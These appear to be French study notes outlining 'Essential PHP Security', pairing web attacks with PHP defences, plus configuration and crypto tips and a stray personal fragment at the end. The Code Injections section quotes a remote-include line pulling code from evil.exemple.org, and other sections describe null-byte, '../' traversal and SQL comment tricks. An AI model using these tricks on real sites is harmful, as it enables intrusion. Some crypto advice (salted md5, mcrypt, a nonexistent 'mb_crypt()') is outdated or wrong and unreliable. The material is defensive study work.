- Sécurité		- ressources			- net				- 			- livre				- synthèse Essential PHP Security						- procédées essentiels			- token			- contrôler les inputs et outputs			- authentification et autorisation par vote à chaque ressources			- htaccess			- système de gestion des exceptions					- failles Technos			- Os				-			- Outils				- 			- Langages				- 		- outils et Cookbook de test de Hacks			- http://www.hacker10.com/tag/backtrack-alternative/		- veilles			- 																														> Synthèse Essential PHP Security - 103 pages- 29 attaques sur 7 composantes- Plan ----------------------------	> FORMS & URLs	- Forms & Datas	- Sementic URLS Attacks	- File Upload Attacks	- Cross Site Scripting	- Cross Site Request Forgeries	- Spoofed Form Submissions	- Spoofed HTTP Requests	> Databases & SQL	- Exposed Autentication Credential	- SQL Injection	- Exposed Datas	> Cookies & Sessions	- Cookie Theft	- Exposed Session Datas	- Session Fixetion	- Session Hijacking	> Includes	- Exposed Source Code	- Backdoors URLs	- Filename Manipulations	- Code Injections	> Files & Commands	- Traversing Filesystem	- Remote File Risks	- Command Injections	> Autorisations & Authentications 	- Brut Force Attacks	- Password Sniffing	- Replay Attacks	- Persistant logins	> Shared Hosting	- Exposed Source Codes	- Exposed Session Datas	- Session Injecting	- Filesytem Browsing	- Safe Mode									> Divers		- Email Injection	- Escape Output	- Browser tab crossing functions + api- Synthèse ---------------------------> FORMS & URLs- Forms & Datas	- Forme		- modification de valeurs de variable		- utilisation des formulaire pour prédire les actions de l'application, entrées via :			- l'URL (GET)			- le content (POST)			- le header (Cookie et header)		- Solution		- utilisation de constantes		- contrôler les données et contrôler l'exposition avec l'identification du tiers		- Sementic URLS Attacks	- Forme		- modification de valeurs de l'URL			- pour accéder à des ressources protégées		- Solution		- contrôler la navigation de chaque profil en confrontant leurs accès aux ressources suivant un système de contrôle		- File Upload Attacks	- Forme		- envoi d'un lien à un fichier, extention douteuse, contenu invalide, modification de l'input caché au nom "Max_File_Size"		et tentative d'accès via le net (répertoir local, ulpoad - après un mapping, au répertoire /tmp) 		- Solution		- vérifier que le fichier a bien été uploadé avec la fonction "is_uploaded_file()"		- déplacer le fichier avec "move_uploaded_file()"		- Cross Site Scripting	- Forme		- Attaque via les formulaires			- Injection de codes pour polluer ou réccupérer des données (cookies)				- Exemple, injection d'un script js de redirection, dans un formulaire qui sera affiché sur les pages de plusieurs profil, pour récupérer via le js les cookies		- Solution		- Filtrer et échapper toutes les entrées			- confronter les format et contenu attendu suivant des shémas				- neutraliser les éléments clés des autres languages ou neutraliser les liens extérieurs		- Filtrer toutes les données de sorties 			- en "htmlentities()" et "stripslashes()" ou "équivalent()"		- Cross Site Request Forgeries	- Forme		- CSRF est un type d'attaque qui permet à un attaquant d'envoyer d'arbitraire requêtes HTTP (POST,GET,...) forgées via des formulaires par une victime inconsciente.			- il test d'abord les portes d'entrées légalement puis exécute les attaques via une victime 				ex. : - passer des commandes fausses ou exécuter d'autres commandes de l'application ou exécuter ses propres scripts		- Solution		- utiliser un token (id unique) à placer dans la session et le formulaire		- on peut limiter la vie du token en placeant une référence temps en session lors de sa création		- Spoofed Form Submissions	- Forme		- copy d'un formulaire, modification du contenu pour attaquer un site ou récupérer des données utilisateurs			- désactivation de contrôle, injection de code, suppression des données, modification de l'url d'envoi		- ne peut pas être détecté (?)		- Solution		- bien filtrer les données d'entrées		- utiliser un token- Spoofed HTTP Requests	- Forme		- identique à la précédente à part que l'attaquant a un contrôle total sur le contenu et format de la requette HTTP		- ne peut être détecté (?)		- Solution		- bien filtrer et surveiller les requêtes	- Note 		- code d'une requete HTTP en POST d'un formulaire		- code d'une requete HTTP via Telnet		- code d'une requete HTTP via PHP et "fsockopen()" - peut automatiser son attaque				> Databases & SQL- Exposed Autentication Credential	- Forme		- définir les valeurs de paramètres de connexion dans un fichier (ex. : .inc) dans le document www/		- Solution		- le disposer en dehors du dossier www/		- SQL Injection	- Forme		- analyse du formulaire des noms (nom de collonne ?) des inputs et test d'injection avec ' ou -- en POST ou GET			- avec ' affichage d'une erreur si on a utiliser "exit(mysql_error())" des noms de collonnes			- avec "--" (faisant passer la suite de la requête en commentaire) login en admin				- si un nom est connu et spécifié "nom --", login sur le compte		- Solution		- filtrer les inputs et échapper les outputs vers MySQL, limite fortement ces attaques		- utiliser les bounds parameters ou les requêtes , offre une protection total		- Exposed Datas	- Forme		- affichage des données via application ou connexion direct à la base de données		- Solution		- encrypter les données les plus sensibles avec "mb_crypt()".		> Cookies & Sessions- Cookie Theft	- Forme		- cause : divilgation de contenu de cookie par les vulnérabilités de navigateurs et Cross Site Scripting		- conséquence : peut mener au Session Hijacking		- Solution		- se tenir au courent des vulnérabilités des navigateurs (online.securityfocus.com)			- détecter les navigateurs et appliquer des patchs à l'algorythme			- éduquer les utilisateurs et les guider sur des procédures de neutralisation		- appliquer les solutions contre la Cross Site Scripting		- Exposed Session Datas	- Forme		- Affichage de données de session			- rare si stocké dans un environnement server, dans une base de données ou le système de fichier		- Solution		- on peut limiter l'exposition en utilisant le SSL		- voir en cryptant le contenu avec une clé disimulée			- utilisation de la fonction "session_set_save_handler()"			- écrire sa propre session			- utilisation de fonction pour encrypter pour stocker et décrypter pour lire			- Session Fixetion	- Forme		- Session Fixation est une attaque qui piège une victime à utiliser une session (id) choisi par l'attaquant via l'URL et PHPSESSID.			- Soit par un simple lien			- Soit par la redirection PHP de niveau protocolaire : "header()"			- Soit par un "Refresh"		- conséquence : de l'appelle d'une session du magasin non détruite et recharge des données (accès à de privilèges élevés), on a réalisé une attaque Session Hijacked 		- Solution		- l'emploi de la fonction "session_regenerate_id()" et le non emploi de l'URL pour envoyer l'identifiant de session peut aider à prévenir l'attaque		- Session Hijacking	- Forme		- une fois un identifiant de session récupérée, l'attaquant peut faire suivre des attaques plus éléborées			- pollution de données par script			- capture de ressources, récupéartion de la base de données et diffusion			- attaque de réputation par un utilisateur		- Solution		- il faut dissimuler au maximum l'identifiant de session			- connexion SSL			- l'emploi de cookies			- l'emploi de tocken crypté dans les URL (différamment du formulaire)> Includes- Exposed Source Code	- Forme		- affichage des données via URL des fichiers .inc ou autre non interprété par PHP		- Solution		- placer tout fichier de type "plein/text" et code PHP en dehors du dossier racine www/		- en complémént on peut configurer Apache pour rendre inaccessible certaines extentions via une directive		- Backdoors URLs	- Forme		- la diffusion d'accès par URL à des pages non intentionnel ou non désirée.			- spider de référencement google		- Solution		- placer tous les includes en dehors du documents root.		- Filename Manipulations	- Forme		- en modifiant les URL l'attaquant peut accéder à des pages contenant des données ou fonctionalités sensibles.		- Solution		- filtrer les URL avec un système de contrôle d'accès aux ressources par profil				- page existante				- page accessible au profil				- Code Injections	- Forme		- en utilisant le système des includes de pages PHP via une référence dans l'URL			- l'attaquant peux accéder à des pages hors profil			- inclure son propre script depuis une URL et l'exécuter sur le server du site				"include 'http://evil.exemple.org/hack'.php;"				- un caractère peux permettre d'ignorer l'extention		- Solution		- filtrer les références de pages récupérée de l'URL			- page existante			- page accessible au profil> Files & Commands- Traversing Filesystem	- Forme		- lors de l'utilisation de la fonction "fopen()" et de la direct définition dynamique par URL du fichier à charger			- on peut commeter les extentions en ajoutant un "NULL" (%00) à la fin du nom du fichier			- on peut remonter dans l'arboressance en utilisant la syntaxe "../" plusieurs fois		- Solution		- filtrer les inputs avec 			- des fonctions de type et la fonction "file_exists()"			- des expressions régulières			- un système de références et un rooter			- Remote File Risks	- Forme		- du à la directive "allow_url_fopen" de Apache, activé par défault		il est possible d'injecter dans le programme tout fichier distant		contenant du code malicieux (code malicieux + code attendu)			- mappage			- reproduction			- extraction de données			- manipulation de données			- emploi des capacités ...		- peut conduire à du Cross-Site Scripting, Injection SQL, ...				- Solution		- filtrer les intputs avec 			- des fonctions de type, d'existance comme la fonction "file_exists()" ou de filtration comme "strip_slashes()"			- l'open_basedir			- des expressions régulières			- un système de références et un rooter 				- filtrer les outputs vers le Client avec			- la fonction "htmlentities()"			- tester le contenu avec des regex		- Command Injections	- Forme		- dans un système Unix avec une application en ligne ou en local, toute emploi de commande shell		peut mener à des failles d'accès à des commandes et au filesystème comme "exec(), passthru(), popen(), shell_exec(), system()"		- Solution		- éviter tout emploi des commands de shell		- filtrer les intputs et les outputs> Autorisations & Authentications 		- Note : tout utilisateur qui peut être impressionné par un attaquant peut désactiver les systèmes de contrôles	- Brut Force Attacks	- Forme		- connaissant l'identifint l'attaque se fait sur le mot de passe sans prédiction par toutes les options possible				- note : requête complète HTTP d'une connexion et authentification à un server		- Solution		- détecter le nombre d'erreurs de login suiccessive à un compte			- rendre le compte inaccessible sur trois erreurs				- réactivation après un délais				- réactivation par réponse à une question secrète			- espacer les possiblités de login		- détecter les ip		- bien différencier un utilisateur d'un attaquant par la consistance des requêtes			- bien analyser le comportement des inputs- Password Sniffing	- Forme		- la récupération de données d'accès à des ressources par l'écoute du trafaique		- Solution		- utiliser le SSL			- dans tous les liens absolue			- par une redirection du port 80			- Replay Attacks	- Forme		- l'attaquant reproduit une séquence d'authentification d'un utilisateur		pour accéder à ses privilèges et ressources		- Solution		- utiliser le SSL		- ne jamais utiliser ou manipuler des données qui offrent un acces permanant à des ressources		- n'utiliser que des données qui n'offre qu'un accès temporaire- Persistant logins (uniquement dans un environnement hermétique et pour confort d'utilisation)	- Forme		- l'utilisation de cookie contenant le login et le passe pour permettre une connexion permanante		peut mener à des attaque de vole de session et de ses privilèges.		- Solution		- ne pas utiliser de données sensible dans le cookie (id ou passe)		- utiliser un système de référence+token crypté et stocké dans le base plus un timer d'accès		- à la déconnexion, détruire le cookie et les données du cookie dans la base		- mettre en place une authentification manuel pour toute commande sensible		- en cas d'exposition demander aux utilisateurs de changer leur mot de passe				- note : exemple de code		> Shared Hosting- Exposed Source Codes	- Forme		- inclusion d'un fichier permettant d'afficher un fichier ou de parcourir tout le système de fichier		- Solution		- limiter les droits d'accès aux fichier au propriétaire uniquement- Exposed Session Datas	- Forme		- les sessions sont stocké tous dans le même dossier /tmp, bienque inaccessible par compte et groupe,		ce dossier l'est par PHP.		- Solution		- Stocker les données sensible dans la Base de Données		- utiliser la fonction "session_set_save_handler()"		- Session Injecting	- Forme		- par un mécanisme similaire au précédant, l'attaquant peut cette fois modifier les données des sessions		- plus dangereux que le session hijacking, l'attaquant peut choisir les valeurs		- Solution		- Stocker les données sensible dans la Base de Données		- utiliser la fonction "session_set_save_handler()"		- Filesytem Browsing	- Forme		- par un mécanisme similaire au précédent, l'attaquant peut parcourir le système de fichiers,		pour récupérer les codes sources par PHP otant les protections de compte		- Solution		- Considérer que tout fichier sur un server mutualisé est exposé		- Stocker les données sensible dans la Base de Données		- Safe Mode	- Forme		- le mode "safe mode" de PHP, réalise une vérification supplémentaire de propriété entre fichiers avant de les exécuter		- ce mécanisme peut être contourné par des commandes en Bash		- ou un script créer par un autre, où celui-ci appartient à Apache (comme les session) soit à nobody		- Solution		- Porter une attention particulières sur les failles de l'infrastructures> Appendix> Configuration directives- allow_url_fopen	- Forme		- permet les "remote file attacks"			- Solution		- à désactiver- disable_functions	- Forme		- permet de désactiver certaines fonction comme "dir()" ou "readfile()"			- Solution		- à sélectionner et désactiver- display_errors	- Forme		- affiche les erreurs			- Solution		- à désactiver en production- enable_dl	- Forme		- permet d'activier la fonction "dl()", peut contourner "open_basedir"			- Solution		- à désactiver sauf besoin spécifique- error_reporting	- Forme		- relève les erreures			- Solution		- à configurer à "E_ALL" (production) ou "E_ALL | E_STRICT" (développement)- file_uploads	- Forme		- permet d'accepter les up-loads de fichiers			- Solution		- à désactiver si non besoin- log_errors	- Forme		- permet de répertorier les erreurs			- Solution		- à toujour activer		- bien définir "error_log" avec le chemin du dossier des erreurs- magic_quotes_gpc	- Forme		- filtre comme "addslashes()" $_GET, $_POST et $_COOKIE			- Solution		- à désactiver			- complexivité inutile et filtrage insuffisant- memory_limit	- Forme		- directive qui permet de spécifier le maximum de mémoire disponible à PHP			- Solution		- à limiter à 8M- open_basedir	- Forme		- limite les fichiers ui peuvent êtrent ouvert à un dossier			- Solution		- à bien le définir		> Fonctions- eval()	- Forme		- est utilisé pour évaluer une chaine de caractère en script PHP	- Solution		- à ne pas utiliser- exec()	- Forme		- permet d'exécuter des commandes shell	- Solution		- à éviter, sinon filtrer et échaper les inputs et outputs- file()	- Forme		- retourne le contenu d'un fichier en tableau de chaque ligne en éléments	- Solution		- faire attention aux contenu des fichiers, 			- limiter le possible par le dossier et l'extention			- faire un filtre sur le tableau récupérer- file_get_contents()	- Forme		- voir file()	- Solution		- voir file()- fopen()	- Forme		- voir file()	- Solution		- voir file()- include	- Forme		- peut permettre l'injection de code	- Solution		- filtrer les données- passthru()	- Forme		- voir exec()	- Solution		- voir exec()- phpinfo()	- Forme		- connue	- Solution		- à limiter au maximum son accès- popen()	- Forme		- voir exec()	- Solution		- voir exec()- preg_replace()	- Forme		- voir exec() - porte le même risque	- Solution		- voir exec()- proc_open()	- Forme		- voir exec()	- Solution		- voir exec()- readfile()	- Forme		- voir file()	- Solution		- voir file()- require	- Forme		- voir include	- Solution		- voir include- shell_exec()	- Forme		- voir exec()	- Solution		- voir exec()- system()	- Forme		- voir exec()	- Solution		- voir exec()				> Cryptography- note : 	- doit être familier avec les types clés de la cryptography suivant :		- Cryptographie Symétrique		- Cryptographie Asymétique		- Fonction de Hashage Crypotgraphique		- Message authentication code (MACs)	- ressources suggérées				- Storing Password	- Forme		- stocker des mots de passe en claire dans la base	- Solution		- hasher avec un salt et md5		- crypter avec mcrypt- Using mcrypt	- Forme		- est l'extention standard pour la cryptographie	- Solution		- utiliser mcrypt_encrypt() et mcrypt_decrypt()		- exemple de class et d'emploi- Storing Crédit Card Numbers	- Forme		- stockage de numéros de carte de crédit	- Solution		- ne pas stocker de numéros de carte de crédit- Encrypting Session Data	- Forme		- base de données ou sessions exposée à un fort risque	- Solution		- crypter avec mcrypt et "session_set_save_handler()"		- exemple de class et d'emploi> Blog - est un { concentré | sélection } de cycles de fase à forte activité, 	- dont l'ensemble génère un cycle global latent avec des porteuses, 		- générant d'autres cycles (plateau de sentiments) des réflexions (tiers, fonction, personne, organisation), 			- d'où on attend une relation pouvant créer d'autres cycle	- semblant remplir une fonction répondant à un besoin- divergence avec mon état, 	- de mes distances de ces feuilles de cycles	- absences 		- {si t'es pauvre c'est complexe}